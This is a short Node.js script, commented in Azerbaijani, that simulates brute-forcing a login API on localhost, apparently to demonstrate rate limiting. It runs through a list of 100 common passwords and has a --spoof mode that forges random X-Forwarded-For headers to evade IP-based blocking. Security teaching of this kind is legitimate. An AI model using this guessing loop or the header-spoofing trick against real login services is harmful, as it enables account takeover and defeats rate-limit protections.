// Brute force simulyasiyası: bir email üçün məşhur parolları bir-bir yoxlayır.
// İşlətmək: node scripts/brute.mjs ali@test.az
// Hücumçunun hiyləsi: node scripts/brute.mjs ali@test.az --spoof
//   (hər request-də saxta X-Forwarded-For header-i — "mən başqa IP-yəm")
const API = "http://127.0.0.1:3000";
const email = process.argv[2] ?? "ali@test.az";
const spoof = process.argv.includes("--spoof");
const randomIp = () => Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join(".");

// Ən çox istifadə olunan parollardan 100-ü (sırası təsadüfi deyil — real siyahılardan)
const PASSWORDS = [
  "12345678", "123456789", "password", "qwerty123", "11111111", "1234567890", "iloveyou", "password1",
  "qwertyuiop", "00000000", "abc12345", "baku2024", "sunshine", "princess", "football", "welcome1",
  "admin123", "letmein1", "monkey12", "dragon12", "master12", "passw0rd", "shadow12", "superman",
  "michael1", "baseball", "trustno1", "azerbaijan", "qazwsxedc", "1q2w3e4r", "zaq12wsx", "asdfghjk",
  "zxcvbnm1", "starwars", "whatever", "freedom1", "nicole12", "jessica1", "computer", "internet",
  "samsung1", "iphone12", "google12", "facebook", "instagram", "123qweasd", "qwe123qwe", "987654321",
  "11223344", "12341234", "aa123456", "a1b2c3d4", "loveyou1", "babygirl", "lovely12", "sweety12",
  "summer24", "winter24", "spring24", "autumn24", "baku1234", "sumqayit", "ganja123", "qarabag1",
  "neftchi1", "parol123", "salam123", "azeri123", "vetən123", "mamam123", "papam123", "sevgi123",
  "ulduz123", "gunes123", "deniz123", "leyla123", "nigar123", "orxan123", "elvin123", "ramil123",
  "parol12345", "student1", "teacher1", "letmein!", "qwerty12", "asdf1234", "zxcv1234", "pass1234",
  "test1234", "demo1234", "user1234", "admin1234", "root1234", "guest123", "hello123", "world123",
  "secret12", "private1", "access12", "unlock12",
];

const started = Date.now();
let rejected = 0;
let blocked = 0;

for (let i = 0; i < PASSWORDS.length; i++) {
  const password = PASSWORDS[i];
  const res = await fetch(`${API}/auth/login`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...(spoof ? { "X-Forwarded-For": randomIp() } : {}),
    },
    body: JSON.stringify({ email, password }),
  });

  if (res.status === 200) {
    const seconds = ((Date.now() - started) / 1000).toFixed(1);
    console.log(`TAPILDI: "${password}" — ${i + 1}-ci cəhd, ${seconds} saniyə`);
    console.log(`Rədd edilən: ${rejected}, bloklanan (429): ${blocked}`);
    process.exit(0);
  }
  if (res.status === 429) blocked++;
  else rejected++;
}

const seconds = ((Date.now() - started) / 1000).toFixed(1);
console.log(`Parol tapılmadı. ${PASSWORDS.length} cəhd, ${seconds} saniyə`);
console.log(`Rədd edilən (401): ${rejected}, bloklanan (429): ${blocked}`);
